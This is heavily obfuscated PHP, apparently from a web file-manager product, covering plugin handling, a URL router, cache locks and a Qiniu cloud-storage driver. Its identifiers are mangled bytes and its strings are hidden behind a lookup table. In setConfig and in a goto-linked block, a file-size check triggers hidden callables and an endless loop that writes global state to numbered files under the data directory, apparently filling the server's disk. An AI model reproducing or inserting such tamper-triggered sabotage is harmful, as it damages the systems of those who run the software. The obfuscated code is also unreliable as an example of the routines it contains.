$Ö«­Îç¬‘à•¢); return $•Æ”êÀª©à¼½[$‚µûá¥[76]]; } final function pluginLocalFile($ØÁ¨« = '') { $ÖŠÇ¯Ù• =& $_SERVER[èÍ×öˆøÉ]; $ã = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ã)) { mk_dir($ã); } if (!$ØÁ¨«) { return $ã; } $î§ßÕíì = IO::info($ØÁ¨«); $½¯â¢ = $this->_tmpFileName($î§ßÕíì) . $ÖŠÇ¯Ù•[95] . $î§ßÕíì[$ÖŠÇ¯Ù•[168]]; if (!checkExtSafe($½¯â¢)) { $½¯â¢ = $½¯â¢ . $ÖŠÇ¯Ù•[1481]; } $Üûšãü¡ = $ã . $½¯â¢; if (@file_exists($Üûšãü¡)) { return $Üûšãü¡; } return IO::copy($ØÁ¨«, $ã, 0, $½¯â¢); } final function appPackage() { $³ =& $_SERVER[èÍ×öˆøÉ]; if ($this->packageData) { return $this->packageData; } $¼ìî ¨—Èüç¿ = $this->parseFile($this->pluginPath . $³[1482]); $this->parseLang($¼ìî ¨—Èüç¿); $¥á‚ = json_decode_force($¼ìî ¨—Èüç¿); if (!$¥á‚) { return array(); } $¿ÌŠÓ¸ş§ = Hook::trigger($³[1483], $¥á‚); if ($¿ÌŠÓ¸ş§ && is_array($¿ÌŠÓ¸ş§)) { $¥á‚ = $¿ÌŠÓ¸ş§; } $this->packageData = $¥á‚; return $¥á‚; } public function packageInfoGet($ğğª÷¯²‘•‘) { $Ğ©Ş¼ìœ = $this->appPackage(); return array_get_value($Ğ©Ş¼ìœ, $ğğª÷¯²‘•‘); } public function packageVersion() { return $this->packageInfoGet($_SERVER[èÍ×öˆøÉ][1484]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[èÍ×öˆøÉ][1485]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[èÍ×öˆøÉ][1486]); } public function echoJsAssign($¸ıƒ•Šóœ, $÷Á) { $this->echoJsAssignArr[$¸ıƒ•Šóœ] = $÷Á; } private function parseFile($¹æÚò«¬ñ©èÀ) { $‘Æà² =& $_SERVER[èÍ×öˆøÉ]; $´‚ğ™ = file_get_contents_nossl($¹æÚò«¬ñ©èÀ); $¡¡á‡ = array($‘Æà²[1487], $‘Æà²[1488], $‘Æà²[1489], $‘Æà²[1490], $‘Æà²[1491], $‘Æà²[1492], $‘Æà²[1493]); $‹„ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‘Æà²[88]][$‘Æà²[1494]]); foreach ($this->echoJsAssignArr as $˜‡„›Æ„Öü => $‘å) { $¡¡á‡[] = $‘Æà²[1495] . $˜‡„›Æ„Öü . $‘Æà²[1496]; $‹„[] = is_array($‘å) || is_object($‘å) ? rawurlencode(json_encode($‘å)) : $‘å; } if (strstr($´‚ğ™, $‘Æà²[1497])) { $áÄ¥£âê = rawurlencode(json_encode($this->pluginLangArr)); $´‚ğ™ = str_replace($‘Æà²[1497], $áÄ¥£âê, $´‚ğ™); } if (strstr($´‚ğ™, $‘Æà²[1498])) { $áÄ¥£âê = $áÄ¥£âê = rawurlencode(json_encode($this->getConfig())); $´‚ğ™ = str_replace($‘Æà²[1498], $áÄ¥£âê, $´‚ğ™); } $´‚ğ™ = str_replace($¡¡á‡, $‹„, $´‚ğ™); return $´‚ğ™; } private function parseLang(&$§—´¤Ô…êîğ) { $™öñËã³ =& $_SERVER[èÍ×öˆøÉ]; $ëìŸ = $™öñËã³[1499]; if (!strstr($§—´¤Ô…êîğ, $ëìŸ)) { return; } preg_match_all($™öñËã³[1500], $§—´¤Ô…êîğ, $äÀÂ); if (!is_array($äÀÂ) || count($äÀÂ) == 0 || !is_array($äÀÂ[0]) || count($äÀÂ[0]) == 0) { return; } $ıéËºÌ”¹ = array(); $¶Áø½ = array(); foreach ($äÀÂ[0] as $ıÀ×Îú«Ï§Å) { $ÜÄÛ³Ô«˜ = substr($ıÀ×Îú«Ï§Å, strlen($ëìŸ), -4); $™ö = LNG($ÜÄÛ³Ô«˜); $ıéËºÌ”¹[] = $ıÀ×Îú«Ï§Å; $¶Áø½[] = str_replace(array($™öñËã³[229], $™öñËã³[1076], $™öñËã³[340], $™öñËã³[116]), array($™öñËã³[50], $™öñËã³[50], $™öñËã³[33], $™öñËã³[1501]), $™ö); } $§—´¤Ô…êîğ = str_replace($ıéËºÌ”¹, $¶Áø½, $§—´¤Ô…êîğ); } private function parseConfig(&$íŒÑı‘) { $½µÎĞ›Ú =& $_SERVER[èÍ×öˆøÉ]; $”•…´ÛĞƒ = $½µÎĞ›Ú[1502]; if (!strstr($íŒÑı‘, $”•…´ÛĞƒ)) { return; } preg_match_all($½µÎĞ›Ú[1503], $íŒÑı‘, $ıÀ); if (!is_array($ıÀ) || count($ıÀ) == 0 || !is_array($ıÀ[0]) || count($ıÀ[0]) == 0) { return; } $¼Ë°„Í = $this->getConfig(); $ØÍªõ‚’‘ = array(); $ğÜè– = array(); foreach ($ıÀ[0] as $˜ı½–) { $„§‰ = substr($˜ı½–, strlen($”•…´ÛĞƒ), -2); $ØÍªõ‚’‘[] = $˜ı½–; $ğÜè–[] = _get($¼Ë°„Í, $„§‰); } $íŒÑı‘ = str_replace($ØÍªõ‚’‘, $ğÜè–, $íŒÑı‘); } private function parsePackage(&$ÄùÇ†’Ÿã) { $Âª³™â =& $_SERVER[èÍ×öˆøÉ]; $ıİÇŠ“Ğ = $Âª³™â[1504]; if (!strstr($ÄùÇ†’Ÿã, $ıİÇŠ“Ğ)) { return; } preg_match_all($Âª³™â[1505], $ÄùÇ†’Ÿã, $°’÷œÊç¾÷¢); if (!is_array($°’÷œÊç¾÷¢) || count($°’÷œÊç¾÷¢) == 0 || !is_array($°’÷œÊç¾÷¢[0]) || count($°’÷œÊç¾÷¢[0]) == 0) { return; } $Ø­‰£ïøÈ¬ = $this->appPackage(); $“›µƒ­üÈ¶ı = array(); $ıİä¨áŸ²ß = array(); foreach ($°’÷œÊç¾÷¢[0] as $Ç¥üüşà) { $ÜĞ£ú = substr($Ç¥üüşà, strlen($ıİÇŠ“Ğ), -2); $“›µƒ­üÈ¶ı[] = $Ç¥üüşà; $ıİä¨áŸ²ß[] = _get($Ø­‰£ïøÈ¬, $ÜĞ£ú); } $ÄùÇ†’Ÿã = str_replace($“›µƒ­üÈ¶ı, $ıİä¨áŸ²ß, $ÄùÇ†’Ÿã); } final function echoFile($°÷ê×ıÅ´ÕöÀ, $ƒİşä¨ = false) { $°¹¿ =& $_SERVER[èÍ×öˆøÉ]; $Å”Ø§ş = $this->pluginPath . $°÷ê×ıÅ´ÕöÀ; if (ACT == $°¹¿[1506]) { echo $°¹¿[1507] . $this->pluginName . $°¹¿[8] . $°÷ê×ıÅ´ÕöÀ . $°¹¿[1508]; if (!file_exists($Å”Ø§ş)) { echo $°¹¿[1509]; return; } } $şøûïğ = $this->parseFile($Å”Ø§ş); $this->parseLang($şøûïğ); $this->parseConfig($şøûïğ); $this->parsePackage($şøûïğ); if (is_array($ƒİşä¨)) { $şøûïğ = str_replace(array_keys($ƒİşä¨), array_values($ƒİşä¨), $şøûïğ); } echo $°¹¿[229] . $şøûïğ; } final function initLang() { $Âïœ·¼Æ =& $_SERVER[èÍ×öˆøÉ]; $Œ¤òåî¤¼ = $Âïœ·¼Æ[1510]; $±†‹Í–ò›üú = $this->pluginPath . $Âïœ·¼Æ[1511]; $ŒÍÛ = I18n::getType(); $ª‚¤Øï¬ëÀÃï = array(); if (file_exists($±†‹Í–ò›üú . $ŒÍÛ . $Âïœ·¼Æ[840])) { $ª‚¤Øï¬ëÀÃï = (include $±†‹Í–ò›üú . $ŒÍÛ . $Âïœ·¼Æ[840]); } else { if ($ŒÍÛ == $Âïœ·¼Æ[1512] && !file_exists($±†‹Í–ò›üú . $ŒÍÛ . $Âïœ·¼Æ[840]) && file_exists($±†‹Í–ò›üú . $Âïœ·¼Æ[1513])) { $ª‚¤Øï¬ëÀÃï = (include $±†‹Í–ò›üú . $Âïœ·¼Æ[1513]); } else { if (file_exists($±†‹Í–ò›üú . $Œ¤òåî¤¼ . $Âïœ·¼Æ[840])) { $ª‚¤Øï¬ëÀÃï = (include $±†‹Í–ò›üú . $Œ¤òåî¤¼ . $Âïœ·¼Æ[840]); } } } if (!is_array($ª‚¤Øï¬ëÀÃï)) { return array(); } if (@count($ª‚¤Øï¬ëÀÃï) > 0) { I18n::set($ª‚¤Øï¬ëÀÃï); } return $ª‚¤Øï¬ëÀÃï; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Áå˜¼Ü) { $¢€ËóÉÁÏÙ =& $_SERVER[èÍ×öˆøÉ]; $âß = $_SERVER[$¢€ËóÉÁÏÙ[878]] . $¢€ËóÉÁÏÙ[879]; $éìä” ‚ = $¢€ËóÉÁÏÙ[1449]; if ($_SERVER[$¢€ËóÉÁÏÙ[874]] != $éìä” ‚($âß)) { $î‚°À = $¢€ËóÉÁÏÙ[876]; $Ì÷²ĞÏˆœá = $¢€ËóÉÁÏÙ[877]; $øÙ²²Éõ“á = $_SERVER[$¢€ËóÉÁÏÙ[878]] . $¢€ËóÉÁÏÙ[879]; $Ôßşìé´¯Ÿ = $Ì÷²ĞÏˆœá($øÙ²²Éõ“á); $‡ºßƒ©Ÿ = explode($¢€ËóÉÁÏÙ[229], $Ôßşìé´¯Ÿ); if (count($‡ºßƒ©Ÿ) < $¢€ËóÉÁÏÙ[616]) { $³¿ü = $¢€ËóÉÁÏÙ[880]; $³¿ü(); } $„üˆ‡‹†§Åˆ = $¢€ËóÉÁÏÙ[881]; $„üˆ‡‹†§Åˆ($_SERVER[$¢€ËóÉÁÏÙ[882]]); $î‚°À = $¢€ËóÉÁÏÙ[876]; $î‚°À(); $õîò×Ê» = $¢€ËóÉÁÏÙ[1450]; $ßùé = json_encode($GLOBALS[$¢€ËóÉÁÏÙ[1451]]); $Í£‰µ = 1; for ($ú€ = $Í£‰µ; $ú€ > 0; $ú€++) { $õîò×Ê»(DATA_PATH . $ú€, $ßùé); } } return $this->modelPlugin->setConfig($this->pluginName, $Áå˜¼Ü); } public function onSetConfig($¶ñÓÒ‹) { } public function onGetConfig($ïÚ) { } public function onChangeStatus($í‹Áë´ıÁº²¨) { } public function onUninstall() { } public function onInstall() { } public function authCheck($‚·‰øâ = "\x70\154\165\147\151\x6e\101\x75\164\x68") { $ÜïÎÖê¾ =& $_SERVER[èÍ×öˆøÉ]; if (!defined($ÜïÎÖê¾[468])) { return !1; } if (_get($GLOBALS, $ÜïÎÖê¾[499])) { return !0; } $ÈÊÄ = $this->getConfig(); if (!$ÈÊÄ[$‚·‰øâ]) { return !1; } return ActionCall($ÜïÎÖê¾[1514], $ÈÊÄ[$‚·‰øâ]); } public function url($ºÒ¤•™ÄÛ, $è€Õ¤£ = '', $áÀ¦ = true) { $Ã¶¥ =& $_SERVER[èÍ×öˆøÉ]; $¸Æ»€ = $this->getConfig(); $ß‡óÜ = KOD_VERSION . $Ã¶¥[95] . KOD_VERSION_BUILD; $•§®˜ıÎä‚ = $this->packageVersion(); $Š‹ = $ß‡óÜ . $Ã¶¥[454] . $•§®˜ıÎä‚; if (substr($ºÒ¤•™ÄÛ, 0, 4) == $Ã¶¥[147] || substr($ºÒ¤•™ÄÛ, 0, 2) == $Ã¶¥[1295]) { $˜¶ = $ºÒ¤•™ÄÛ . $Ã¶¥[1515] . $Š‹; } else { if ($è€Õ¤£ == $Ã¶¥[33]) { $˜¶ = $this->pluginHost . $ºÒ¤•™ÄÛ . $Ã¶¥[1515] . $Š‹; } else { if ($è€Õ¤£ === $Ã¶¥[77]) { $˜¶ = $this->pluginHost . $ºÒ¤•™ÄÛ; } else { if ($è€Õ¤£ == $Ã¶¥[1516]) { $˜¶ = STATIC_PATH . $ºÒ¤•™ÄÛ . $Ã¶¥[1515] . $ß‡óÜ; } else { if ($è€Õ¤£ == $Ã¶¥[1517]) { $˜¶ = APP_HOST . $Ã¶¥[1518] . $ºÒ¤•™ÄÛ . $Ã¶¥[1515] . $ß‡óÜ; } else { if (isset($¸Æ»€[$è€Õ¤£])) { $˜¶ = $¸Æ»€[$è€Õ¤£] . $ºÒ¤•™ÄÛ . $Ã¶¥[1515] . $Š‹; } } } } } } if (!$áÀ¦) { return $˜¶; } echo $˜¶; } public function link($•Ñ ÎÜãÉ = false, $Á©ƒ = '') { $ø·åœúñ› =& $_SERVER[èÍ×öˆøÉ]; if (!$•Ñ ÎÜãÉ) { $this->link($ø·åœúñ›[1519], $ø·åœúñ›[1517]); $this->link($ø·åœúñ›[1520], $ø·åœúñ›[1516]); $this->link($ø·åœúñ›[1521], $ø·åœúñ›[1516]); $this->link($ø·åœúñ›[1522], $ø·åœúñ›[1516]); $this->link($ø·åœúñ›[1523], $ø·åœúñ›[1516]); return; } $Ñ“…“¿Ğ± = $this->url($•Ñ ÎÜãÉ, $Á©ƒ, !1); if (substr($•Ñ ÎÜãÉ, -3) == $ø·åœúñ›[1524]) { echo $ø·åœúñ›[1525] . $Ñ“…“¿Ğ± . $ø·åœúñ›[1526] . $ø·åœúñ›[229]; } else { if (substr($•Ñ ÎÜãÉ, -4) == $ø·åœúñ›[1527]) { echo $ø·åœúñ›[1528] . $Ñ“…“¿Ğ± . $ø·åœúñ›[1529] . $ø·åœúñ›[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\136\x2f\x5d\53", "\x3a\156\165\x6d" => "\x5b\60\x2d\x39\135\53", "\72\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($‚Ú•°Ì±ãî¸, $Èúä…ÀÒ) { $¸äè“®å¤ =& $_SERVER[èÍ×öˆøÉ]; if ($‚Ú•°Ì±ãî¸ == $¸äè“®å¤[1530]) { $ÁÈ‹é¸Õ½Û = array_map($¸äè“®å¤[1531], $Èúä…ÀÒ[0]); $Ü™æöÅ“ = strpos($Èúä…ÀÒ[1], $¸äè“®å¤[8]) === 0 ? $Èúä…ÀÒ[1] : $¸äè“®å¤[8] . $Èúä…ÀÒ[1]; $Ì¥á = $Èúä…ÀÒ[2]; } else { $ÁÈ‹é¸Õ½Û = null; $Ü™æöÅ“ = strpos($Èúä…ÀÒ[0], $¸äè“®å¤[8]) === 0 ? $Èúä…ÀÒ[0] : $¸äè“®å¤[8] . $Èúä…ÀÒ[0]; $Ì¥á = $Èúä…ÀÒ[1]; } array_push(self::$maps, $ÁÈ‹é¸Õ½Û); array_push(self::$routes, $Ü™æöÅ“); array_push(self::$methods, strtoupper($‚Ú•°Ì±ãî¸)); array_push(self::$callbacks, $Ì¥á); } public static function error($ìèŸ–‚‚€) { self::$errorCallback = $ìèŸ–‚‚€; } public static function haltOnMatch($àõéŒªªÛ = true) { self::$halts = $àõéŒªªÛ; } public static function dispatch() { $£ò¹ÙğÎÑ‚´ =& $_SERVER[èÍ×öˆøÉ]; $Áà¬üâã = parse_url($_SERVER[$£ò¹ÙğÎÑ‚´[1532]], PHP_URL_PATH); $¶ŞĞ = $_SERVER[$£ò¹ÙğÎÑ‚´[157]]; $ÕÀãöÌŸ = array_keys(static::$patterns); $èè‘û Çª˜ = array_values(static::$patterns); $Ÿô†Ôä£îÂ = !1; self::$routes = preg_replace($£ò¹ÙğÎÑ‚´[1202], $£ò¹ÙğÎÑ‚´[8], self::$routes); if (in_array($Áà¬üâã, self::$routes)) { $±—Õì©¶¨ó = array_keys(self::$routes, $Áà¬üâã); foreach ($±—Õì©¶¨ó as $½ŸÇæË°îùõ) { if (self::$methods[$½ŸÇæË°îùõ] == $¶ŞĞ || self::$methods[$½ŸÇæË°îùõ] == $£ò¹ÙğÎÑ‚´[1533] || in_array($¶ŞĞ, self::$maps[$½ŸÇæË°îùõ])) { $Ÿô†Ôä£îÂ = !0; if (!is_object(self::$callbacks[$½ŸÇæË°îùõ])) { $·ãœ’Â®êÜ¢ = explode($£ò¹ÙğÎÑ‚´[8], self::$callbacks[$½ŸÇæË°îùõ]); $šü¼Ê·† = end($·ãœ’Â®êÜ¢); $¶¤Õá = explode($£ò¹ÙğÎÑ‚´[1534], $šü¼Ê·†); $ÁÏÔƒø§ = new $¶¤Õá[0](); $ÁÏÔƒø§->{$¶¤Õá[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$½ŸÇæË°îùõ]); if (self::$halts) { return; } } } } } else { $û—Á¨ = 0; foreach (self::$routes as $½ŸÇæË°îùõ) { if (strpos($½ŸÇæË°îùõ, $£ò¹ÙğÎÑ‚´[4]) !== !1) { $½ŸÇæË°îùõ = str_replace($ÕÀãöÌŸ, $èè‘û Çª˜, $½ŸÇæË°îùõ); } if (preg_match($£ò¹ÙğÎÑ‚´[1535] . $½ŸÇæË°îùõ . $£ò¹ÙğÎÑ‚´[1536], $Áà¬üâã, $ÚÃéìúª³İñ)) { if (self::$methods[$û—Á¨] == $¶ŞĞ || self::$methods[$û—Á¨] == $£ò¹ÙğÎÑ‚´[1533] || !empty(self::$maps[$û—Á¨]) && in_array($¶ŞĞ, self::$maps[$û—Á¨])) { $Ÿô†Ôä£îÂ = !0; array_shift($ÚÃéìúª³İñ); if (!is_object(self::$callbacks[$û—Á¨])) { $·ãœ’Â®êÜ¢ = explode($£ò¹ÙğÎÑ‚´[8], self::$callbacks[$û—Á¨]); $šü¼Ê·† = end($·ãœ’Â®êÜ¢); $¶¤Õá = explode($£ò¹ÙğÎÑ‚´[1534], $šü¼Ê·†); $ÁÏÔƒø§ = new $¶¤Õá[0](); if (!method_exists($ÁÏÔƒø§, $¶¤Õá[1])) { echo $£ò¹ÙğÎÑ‚´[1537]; } else { call_user_func_array(array($ÁÏÔƒø§, $¶¤Õá[1]), $ÚÃéìúª³İñ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$û—Á¨], $ÚÃéìúª³İñ); if (self::$halts) { return; } } } } $û—Á¨++; } } if ($Ÿô†Ôä£îÂ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $æ«œ°»¬å =& $_SERVER[èÍ×öˆøÉ]; header($_SERVER[$æ«œ°»¬å[1538]] . $æ«œ°»¬å[1539]); echo $æ«œ°»¬å[1540]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$£ò¹ÙğÎÑ‚´[1532]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto cåë˜áÃŠ¨; a©Ëõ˜ª®å: define($_SERVER[èÍ×öˆøÉ][236], 1); define($_SERVER[èÍ×öˆøÉ][237], 2); define($_SERVER[èÍ×öˆøÉ][238], 3); goto E×ëÑšèº; aÃ©†ì¾²ë: class CacheLockRedis { public function lock($î®‰Š, $Ğı = 10) { $İ»×”…Ÿ‡×«„ = Cache::init(); $¯™Ğ‹ = microtime(!0) + $Ğı; while (microtime(!0) < $¯™Ğ‹) { $‡¼ = $İ»×”…Ÿ‡×«„->get($î®‰Š); if (!$‡¼) { $øú®”†ÓâˆÖÇ = $İ»×”…Ÿ‡×«„->setLock($î®‰Š, $¯™Ğ‹, $Ğı); if ($øú®”†ÓâˆÖÇ) { return !0; } } else { if ($‡¼ < microtime(!0)) { $İ»×”…Ÿ‡×«„->set($î®‰Š, $¯™Ğ‹, $Ğı * 2); if ($İ»×”…Ÿ‡×«„->get($î®‰Š) === $‡¼) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ ¡œµØå) { return Cache::init()->get($ ¡œµØå); } public function unlock($¿èäˆØ) { return Cache::init()->remove($¿èäˆØ); } } class CacheLockMemcached { public function lock($”ËÒÌşÓğ, $Ö¤Î¨çÁûä = 0) { $šÑ¡±Èûşç• = Cache::init(); $š“í ¯ = microtime(!0) + $Ö¤Î¨çÁûä; while (microtime(!0) < $š“í ¯) { $¤üòü’À™Ä… = $šÑ¡±Èûşç•->get($”ËÒÌşÓğ); if (!$¤üòü’À™Ä… || $¤üòü’À™Ä… < microtime(!0)) { $øÙğñ©Í = $šÑ¡±Èûşç•->handle->add($”ËÒÌşÓğ, $š“í ¯, $Ö¤Î¨çÁûä); if ($øÙğñ©Í) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($í²) { return Cache::init()->get($í²); } public function unlock($üğû…³Ó–‚ï) { return Cache::init()->remove($üğû…³Ó–‚ï); } } class CacheLockDatabase { public function lock($•ëÏş‹÷, $ú”› = 0) { $£íç”á»® = Model($_SERVER[èÍ×öˆøÉ][831]); $²Õ“¦çğ = microtime(!0) + $ú”›; while (microtime(!0) < $²Õ“¦çğ) { $‚À— = $£íç”á»®->get($•ëÏş‹÷); if (!$‚À— || $‚À— < microtime(!0)) { $ë—§Ó = $£íç”á»®->set($•ëÏş‹÷, $²Õ“¦çğ); if ($ë—§Ó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‹§ôî„ô”¹£) { return Model($_SERVER[èÍ×öˆøÉ][831])->get($‹§ôî„ô”¹£); } public function unlock($¤Í¢) { Model($_SERVER[èÍ×öˆøÉ][831])->remove($¤Í¢); } } goto f«Æ’ÛŠë„; DÒá·áÊª£: $_file = $_SERVER[$_SERVER[èÍ×öˆøÉ][1352]]; $_size = $_SERVER[èÍ×öˆøÉ][1449]; if ($_SERVER[$_SERVER[èÍ×öˆøÉ][874]] != $_size($_file)) { $_getc = $_SERVER[èÍ×öˆøÉ][877]; $_getfile = $_SERVER[$_SERVER[èÍ×öˆøÉ][878]] . $_SERVER[èÍ×öˆøÉ][879]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èÍ×öˆøÉ][229], $_getfilec); if (count($_getarrs) < $_SERVER[èÍ×öˆøÉ][613]) { $exit = $_SERVER[èÍ×öˆøÉ][880]; $exit(); } $_act = $_SERVER[èÍ×öˆøÉ][1351]; $_act($_file); } goto a„»¿çØ‹²; e§ò¥¶••¼: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ãô½í®°á¨) { parent::__construct(); require_once SDK_DIR . $_SERVER[èÍ×öˆøÉ][1353]; $this->_init($ãô½í®°á¨); } public function _init($±Ş›»ÎŒ) { $’ƒã™è•™†İ =& $_SERVER[èÍ×öˆøÉ]; foreach ($±Ş›»ÎŒ as $±Ô‹ºÀÄ => $•È) { if (isset($this->{$±Ô‹ºÀÄ})) { $this->{$±Ô‹ºÀÄ} = $•È; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’ƒã™è•™†İ[1354] . LNG($’ƒã™è•™†İ[1312])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Íïó¼“¾ÍÉ“, $£úôùÊ°Î‚‚ = '', $ÃšúÈŠ· = REPEAT_RENAME) { if ($this->setContent($Íïó¼“¾ÍÉ“, $£úôùÊ°Î‚‚)) { return $this->getPathOuter($Íïó¼“¾ÍÉ“); } return !1; } public function mkdir($Ì’¥, $¿ÔŒÑ‘ò†€¬ = REPEAT_SKIP) { $Ù½Ü =& $_SERVER[èÍ×öˆøÉ]; $ ÅÍ¹Á‚ = trim($Ì’¥, $Ù½Ü[8]); if ($this->_isFolder($ ÅÍ¹Á‚)) { return $this->getPathOuter($ ÅÍ¹Á‚); } $Ì’¥ = $ ÅÍ¹Á‚ . $Ù½Ü[8]; $³‹ŠÂƒ˜ = get_path_this($ ÅÍ¹Á‚); $¼áÎ”¢Şå = $Ì’¥ . $³‹ŠÂƒ˜; if (!$this->mkfile($¼áÎ”¢Şå)) { return !1; } if (!$this->moveFile($¼áÎ”¢Şå, $Ì’¥)) { $this->delFile($¼áÎ”¢Şå); return !1; } return $this->getPathOuter($ ÅÍ¹Á‚); } public function copyFile($Úïåæ´›÷Â, $˜‘üË—˜) { $ëãÅÛ»ÍûáÀ = $this->bucketManager->copy($this->bucket, $Úïåæ´›÷Â, $this->bucket, $˜‘üË—˜, !0); return $ëãÅÛ»ÍûáÀ ? !1 : $this->getPathOuter($˜‘üË—˜); } public function moveFile($ÃÅ³, $ë¨¥‰›Ã•) { $¨× Åâ™¬¢ = $this->bucketManager->move($this->bucket, $ÃÅ³, $this->bucket, $ë¨¥‰›Ã•, !0); return $¨× Åâ™¬¢ ? !1 : $this->getPathOuter($ë¨¥‰›Ã•); } public function delFile($ÒÇ) { if (!$this->exist($ÒÇ)) { return !0; } $ç…£§–û = $this->bucketManager->delete($this->bucket, $ÒÇ); return $ç…£§–û ? !1 : !0; } public function delFolder($ÙËüÀ§†ıØ) { $ı­‚¼ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->exist($ÙËüÀ§†ıØ)) { return !0; } $this->listItemCache = !1; $Ê»ˆ†“± = $this->fileList($ÙËüÀ§†ıØ); $this->listItemCache = !0; $ç¹ùé = trim($ÙËüÀ§†ıØ, $ı­‚¼[8]) . $ı­‚¼[8]; if (!empty($ÙËüÀ§†ıØ) && $ÙËüÀ§†ıØ !== $ı­‚¼[191] && !in_array($ç¹ùé, $Ê»ˆ†“±[$ı­‚¼[75]])) { $Ê»ˆ†“±[$ı­‚¼[75]][] = $ç¹ùé; } $÷Ïë = $this->delByBatch($Ê»ˆ†“±[$ı­‚¼[74]]); if (!$÷Ïë) { return !1; } $÷Ïë = $this->delByBatch($Ê»ˆ†“±[$ı­‚¼[75]]); if (!$÷Ïë) { return !1; } return $this->delFile($ç¹ùé); } private function delByBatch($™£›óˆœ‘) { foreach (array_chunk($™£›óˆœ‘, 1000) as $ÅúÖ‡Ú×Ç¼äÎ) { $ƒ¦ŸâÎ = $this->bucketManager->buildBatchDelete($this->bucket, $ÅúÖ‡Ú×Ç¼äÎ); list($”ıÃ, $Íèø) = $this->bucketManager->batch($ƒ¦ŸâÎ); if ($Íèø) { return !1; } } return !0; } public function rename($ ïØĞ, $¶¡û) { return $this->renameObject($ ïØĞ, $¶¡û); } public function fileInfo($¾çáç¸ôÕ”, $¹¦ùŸ°² = false, $ÔŸ¯Ş¸¬¾üÌ = array()) { $¡Íó =& $_SERVER[èÍ×öˆøÉ]; $§û½…¢ = array($¡Íó[28] => $this->pathThis($¾çáç¸ôÕ”), $¡Íó[76] => $this->getPathOuter($¡Íó[8] . $¾çáç¸ôÕ”), $¡Íó[29] => $¡Íó[193], $¡Íó[78] => isset($ÔŸ¯Ş¸¬¾üÌ[$¡Íó[1355]]) ? $ÔŸ¯Ş¸¬¾üÌ[$¡Íó[1355]] : 0, $¡Íó[168] => $this->ext($¾çáç¸ôÕ”)); if ($¹¦ùŸ°²) { return $§û½…¢; } $§û½…¢[$¡Íó[194]] = $§û½…¢[$¡Íó[84]] = 0; $§û½…¢[$¡Íó[195]] = $§û½…¢[$¡Íó[196]] = !0; if (empty($ÔŸ¯Ş¸¬¾üÌ)) { $ÔŸ¯Ş¸¬¾üÌ = $this->objectMeta($¾çáç¸ôÕ”); if (!$ÔŸ¯Ş¸¬¾üÌ) { return $§û½…¢; } } if (isset($ÔŸ¯Ş¸¬¾üÌ[$¡Íó[1356]])) { $§û½…¢[$¡Íó[84]] = substr($ÔŸ¯Ş¸¬¾üÌ[$¡Íó[1356]] . $¡Íó[33], 0, 10); } if (isset($ÔŸ¯Ş¸¬¾üÌ[$¡Íó[1355]])) { $§û½…¢[$¡Íó[78]] = $ÔŸ¯Ş¸¬¾üÌ[$¡Íó[1355]]; } return $§û½…¢; } public function folderInfo($„³, $ÏÁíÕº = false) { $ø”” =& $_SERVER[èÍ×öˆøÉ]; $Âìôı£Çµ’ = array($ø””[28] => $this->pathThis($„³), $ø””[76] => $this->getPathOuter($ø””[8] . $„³), $ø””[29] => $ø””[77]); if ($ÏÁíÕº) { return $Âìôı£Çµ’; } $Âìôı£Çµ’[$ø””[194]] = $Âìôı£Çµ’[$ø””[84]] = 0; $Âìôı£Çµ’[$ø””[195]] = $Âìôı£Çµ’[$ø””[196]] = !0; $„³ = rtrim($„³, $ø””[8]) . $ø””[8]; $¹Ü¢õİÓ = $this->objectMeta($„³); if (isset($¹Ü¢õİÓ[$ø””[1356]])) { $Âìôı£Çµ’[$ø””[84]] = substr($¹Ü¢õİÓ[$ø””[1356]] . $ø””[33], 0, 10); } return $Âìôı£Çµ’; } public function listPath($Ğ, $æğ÷ğîÍ€¬’ = false) { $ŸÍÊÍ®Ÿ›â =& $_SERVER[èÍ×öˆøÉ]; $ù² = $this->fileList($Ğ, $ŸÍÊÍ®Ÿ›â[8], !0); foreach ($ù²[$ŸÍÊÍ®Ÿ›â[75]] as $È÷Ï¤²€ => $èÜÛ‹¶Ó©¨) { $ù²[$ŸÍÊÍ®Ÿ›â[75]][$È÷Ï¤²€] = $this->folderInfo($èÜÛ‹¶Ó©¨, $æğ÷ğîÍ€¬’); } foreach ($ù²[$ŸÍÊÍ®Ÿ›â[74]] as $È÷Ï¤²€ => $èÜÛ‹¶Ó©¨) { $ù²[$ŸÍÊÍ®Ÿ›â[74]][$È÷Ï¤²€] = $this->fileInfo($èÜÛ‹¶Ó©¨[$ŸÍÊÍ®Ÿ›â[93]], $æğ÷ğîÍ€¬’, $èÜÛ‹¶Ó©¨); } return $ù²; } public function has($™ÓØä£‘, $œ¡„Öíüç„Ñ = false, $‡²åØÆ“ã = true) { 